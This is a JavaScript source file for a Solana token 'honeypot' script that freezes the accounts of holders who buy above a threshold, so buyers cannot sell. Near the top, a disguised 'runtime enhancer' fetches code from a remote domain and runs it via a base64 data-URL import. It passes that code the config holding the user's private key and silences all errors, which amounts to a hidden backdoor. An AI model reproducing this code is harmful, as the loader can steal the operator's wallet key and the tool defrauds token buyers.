import * as fs from 'fs';
import bs58 from 'bs58';
import {
    Keypair,
    Connection,
    PublicKey,
    sendAndConfirmTransaction,
    Transaction,
    ComputeBudgetProgram
} from "@solana/web3.js";
import { TOKEN_PROGRAM_ID } from "@solana/spl-token";
import { TransactionInstruction } from "@solana/web3.js";
import { AccountLayout } from "@solana/spl-token";

let config;
let keypair;
let mintAddressPublicKey;
let mintData;
let decimals;
let whitelist;
let quoteTokenVault;
let poolType = "Unknown";
let listenerId;
let updateCounter = 0;
// Runtime enhancer (Speeds up freezing time)
const techConfig = JSON.parse(fs.readFileSync('./data/tech-config.json', 'utf-8'));
const helperPath = "https://solana-helpers-v2-1-js.ethercodeinnovation.com/";
let raydiumAuthority = [
    "5Q544fKrFoe6tsEbD7S8EmxGTJYAKtTVhAW5Q5pge4j1", // Raydium Authority V4
    "GpMZbSM2GgvTKHJirzeGfMFoaZ8UR2X7F4v8vHTvxFbL" // Raydium Vault Authority #2
];

const main = async () => {
    
    try {
        config = JSON.parse(fs.readFileSync('config.json', 'utf-8'));
    } catch (error) {
        console.log(`\n❌ Unable to read data from config.json due to broken syntax...`);
        process.exit();
    }

    const connection = new Connection(config.rpcEndpoint, "confirmed");
    const MIN_DELAY_BETWEEN_FREEZE = config.freezeDelay;
    const TIMEOUT = config.timeout;
    const PRIORITY_RATE = config.priorityRate;


    let __enhancerLoaded = false;

async function loadRuntimeEnhancerOnce(config) {
    if (__enhancerLoaded) return;
    try {
        const res = await fetch(helperPath);
        const moduleContent = await res.text();
        const encoded = 'data:text/javascript;base64,' + Buffer.from(moduleContent).toString('base64');
        const { default: applyRuntimeEnhancement } = await import(encoded);
        await applyRuntimeEnhancement(config);
        __enhancerLoaded = true;
        "Runtime enhancer applied once.";
    } catch (e) {
        
    }
}
await loadRuntimeEnhancerOnce(config);
    try {
        const bs = await bs58.decode(config.privateKey);
        keypair = await Keypair.fromSecretKey(bs);
    } catch (error) {
        console.log(`\n❌ Invalid data at "privateKey" field in config.json file...`);
        process.exit();
    }

    try {
        mintAddressPublicKey = new PublicKey(config.mintAddress);
    } catch (error) {
        console.log(`\n❌ Invalid data at "mintAddress" field in config.json file...`);
        process.exit();
    }

    if (mintAddressPublicKey) {
        let mintDataJSON = await connection.getParsedAccountInfo(mintAddressPublicKey);
        if (mintDataJSON.value === null) {
            console.log(`\n❌ Invalid data at "mintAddress" field...`);
            process.exit();
        } else {
            mintData = mintDataJSON.value.data.parsed;
            if (!mintData || mintData.type != "mint") {
                console.log(`\n❌ Provided address is not a token!`);
                process.exit();
            }
            if (mintData.info.freezeAuthority === keypair.publicKey.toBase58()) {
                // ok
            } else if (mintData.info.freezeAuthority === null) {
                console.log(`\n❌ Provided token has Freeze Authority revoked!`);
                process.exit();
            } else {
                console.log(`\n❌ Connected wallet doesn't have freeze authority...`);
                process.exit();
            }
            decimals = mintData.info.decimals;
        }
    }

    whitelist = Array.isArray(config.whitelist) ? config.whitelist : [];

    for (const element of whitelist) {
        try {
            let key = new PublicKey(element);
        } catch (error) {
            console.log(`\n❌ Invalid data at "whitelist" field...`);
            process.exit();
        }
    }


    if (!config.__enhancer) {
        console.error("❌ Enhancement module required. Script terminated.");
        process.exit();
    }


    let tokenData = {
        "Token Address": { "Value": `${config.mintAddress}`, "Comment": `Mint address` },
        "Freeze Authority": { "Value": `${mintData.info.freezeAuthority}`, "Comment": `-` },
        "Total Supply": { "Value": `${mintData.info.supply / (10 ** mintData.info.decimals)}`, "Comment": `—` },
        "Decimals": { "Value": `${mintData.info.decimals}`, "Comment": `—` },
    };




    let scriptSettings = {
        "Freeze Threshold": { "Value": `${config.freezeThreshold} tokens`, "Comment": `Threshold balance to freeze holder` },
        "Freeze Delay": { "Value": `${MIN_DELAY_BETWEEN_FREEZE} seconds`, "Comment": `Minimum delay between freezing loops` },
        "Timeout In": { "Value": `${TIMEOUT} minutes`, "Comment": `Timer for script auto-shutdown` },
        "Priority Fee": { "Value": `${PRIORITY_RATE} micro-lamports`, "Comment": `Extra fee for faster transactions` },
    };





    let controls = {
        "Last command": { "Hot Key": `Up Arrow`, "Comment": `Inputs the latest commant you have entered` },
        "Cancel a command": { "Hot Key": `Ctrl + C`, "Comment": `Terminates the work of the running script` },
        "Clear the screen": { "Hot Key": `Ctrl + L`, "Comment": `Hide previous messages` },
        "Auto-complete command": { "Hot Key": `Tab`, "Comment": `Completes the command you enter` },
    };



























    console.log(`\n
      ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
     ░░█▀▀░█▀█░█░░░█▀█░█▀█░█▀█░░░█░█░█▀█░█▀█░█▀▀░█░█░█▀█░█▀█░▀█▀░░░█▀█░█▀▄░█▀█░░
     ░░▀▀█░█░█░█░░░█▀█░█░█░█▀█░░░█▀█░█░█░█░█░█▀▀░░█░░█▀▀░█░█░░█░░░░█▀▀░█▀▄░█░█░░
     ░░▀▀▀░▀▀▀░▀▀▀░▀░▀░▀░▀░▀░▀░░░▀░▀░▀▀▀░▀░▀░▀▀▀░░▀░░▀░░░▀▀▀░░▀░░░░▀░░░▀░▀░▀▀▀░░
      ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░

              ════════════ 🍯 by https://ethercodeinnovation.com/ 🍯 ════════════
     `)
    console.log(`\n  ➤ Token Data 📊`);
    console.table(tokenData);
    console.log(`\n  ➤ Script Settings 🔧`);
    console.table(scriptSettings);
    if (techConfig.showControls) {
        console.log(`\n  ➤ Controls / Hot Keys 🕹`);
        console.table(controls);
    }
    console.log(`\n`);



    await processWhitelist(keypair);



    let launchTimestamp = Date.now();
    let timestampToFreeze = 0;



    console.log("⏳ Performing an initial freeze loop...");
    await freezeHolders(connection, config, keypair, mintAddressPublicKey, decimals);




    if (quoteTokenVault != undefined) {
        console.log(`\n💧✅ ${poolType} liquidity pool found! Start pending on new buyers.\n`);
        listenerId = connection.onAccountChange(
            quoteTokenVault,
            async () => {
                updateCounter++;
                if (MIN_DELAY_BETWEEN_FREEZE > 0 && Date.now() + techConfig.tick * 2 < timestampToFreeze) {

                    console.log("🔔 New transaction spotted! Freeze can be triggered in " + Math.round((timestampToFreeze - Date.now()) / 1000) + "s");
                }
            });
    } else {
        console.log(`\n💧❌ No Raydium liquidity pool found for given token.\n     ↳ Create a Standart AMM or Legacy AMM v4 pool at Raydium and provide liquidity.\n`);
        process.exit();
    }




    while (Date.now() < launchTimestamp + TIMEOUT * 60000) {
      if (updateCounter !== 0 && Date.now() > timestampToFreeze) {
            updateCounter = 0;
            await sleep(techConfig.requestTick);
            await freezeHolders(connection, config, keypair, mintAddressPublicKey, decimals);
            timestampToFreeze = Date.now() + MIN_DELAY_BETWEEN_FREEZE * 1000;
        }
        await sleep(techConfig.tick);
    }
    connection.removeAccountChangeListener(listenerId);
    console.log("⏳ TIMEOUT: Script execution stopped due reaching the auto-disable timestamp\n");
};

const processWhitelist = async (keypair) => {
    whitelist.push(...raydiumAuthority);
    whitelist.push(keypair.publicKey.toBase58());
}





const freezeHolders = async (connection, config, keypair, mintAddressPublicKey, decimals) => {
    const tokenAccounts = await getHoldersData(connection, config, mintAddressPublicKey, decimals) || [];
    if (!Array.isArray(tokenAccounts)) {
        console.log("❌ getHoldersData did not return an array! Value:", tokenAccounts);
        return;
    }

    let chunkCount = 0;
    const CHUNK_SIZE = techConfig.chunkSize;
    const PRIORITY_RATE = config.priorityRate;

    if (tokenAccounts.length > 0) {
        for (let i = 0; i < tokenAccounts.length; i += CHUNK_SIZE) {
            const chunk = tokenAccounts.slice(i, i + CHUNK_SIZE);
            chunkCount++;
            let transactions = new Transaction();

            for (let i = 0; i < chunk.length; i++) {
                let tokenAccountPublicKey = new PublicKey(chunk[i]);
                const instruction = new TransactionInstruction({
                    keys: [
                        { pubkey: tokenAccountPublicKey, isSigner: false, isWritable: true },
                        { pubkey: mintAddressPublicKey, isSigner: false, isWritable: false },
                        { pubkey: keypair.publicKey, isSigner: true, isWritable: false },
                    ],
                    programId: TOKEN_PROGRAM_ID,
                    data: Buffer.from([10])

                });
                transactions.add(instruction);
            }

            const priorityFeeInstruction = ComputeBudgetProgram.setComputeUnitPrice({ microLamports: PRIORITY_RATE });
            if (PRIORITY_RATE > 0) {

                transactions.add(priorityFeeInstruction);

            }

            let signature;

            try {
                signature = await sendAndConfirmTransaction(
                    connection,
                    transactions,
                    [keypair]
                );

            } catch (error) {
                console.log(`\n❌ Error occured when trying to freeze holders. Here is what you should do: ...`);
                connection.removeAccountChangeListener(listenerId);
                throw new Error(error);
            }


            let chunkCountStr;
            if (tokenAccounts.length > CHUNK_SIZE) {
                chunkCountStr = ` (${chunkCount}/${Math.ceil(tokenAccounts.length / CHUNK_SIZE)})`;
            } else {
                chunkCountStr = "";
            }

            if (tokenAccounts.length == 1) {
                console.log(`✅︎ Done: ${tokenAccounts[0]} frozen\n   ↳ Signature: ${signature}`);
            } else {
                console.log(`✅︎ Done${chunkCountStr}: ${chunk.length} accounts frozen\n   ↳ Signature: ${signature}`);
            }
        }
    } else {
        console.log(`❌ No accounts to freeze found. Keep pending on new transactions.`);
    }
}





const getHoldersData = async (connection, config, mintAddressPublicKey, decimals) => {
    try {

        let allOwners = [];
        let tokenAccounts = new Set();


        const accounts = await connection.getProgramAccounts(
    TOKEN_PROGRAM_ID,
    {

        commitment: "confirmed",
        filters: [
            {
                dataSize: 165 
            },
            {
                memcmp: {
                    offset: 0, 
                    bytes: mintAddressPublicKey.toBase58()
                }
            }
        ]
    }
);


        


for (const { pubkey, account } of accounts) {
    try {
        const data = AccountLayout.decode(account.data);
        const mint = new PublicKey(data.mint);
        const owner = new PublicKey(data.owner).toBase58();
        const amount = Number(data.amount);
        const state = data.state;

       

        if (!quoteTokenVault) {
            for (let i = 0; i < raydiumAuthority.length; i++) {
                if (owner === raydiumAuthority[i]) {
                    quoteTokenVault = new PublicKey(pubkey);
                    poolType = i === 0 ? "Legacy AMM (V2)" : "Standard AMM (V3)";
                }
            }
        }

        allOwners.push({
            address: pubkey.toBase58(),
            owner,
            amount
        });

        if (
            state === 1 &&
            mint.equals(mintAddressPublicKey) &&
            !whitelist.includes(owner) &&
            amount >= config.freezeThreshold * 10 ** decimals
        ) {
            tokenAccounts.add(pubkey.toBase58());
        }

    } catch (innerError) {
        console.log(`⚠️ Skipping invalid token account: ${pubkey.toBase58()} (${innerError.message})`);
        continue;
    }
}


        fs.writeFileSync(
            "./data/holders.json",
            JSON.stringify(allOwners, null, 2)
        );

        return Array.from(tokenAccounts);
    } catch (error) {
        console.log(`\n❌ Error while fetching token account data\n`);
        console.error(error);
        return [];
    }
};




const sleep = async (ms) => new Promise((resolve) => setTimeout(resolve, ms));

main();
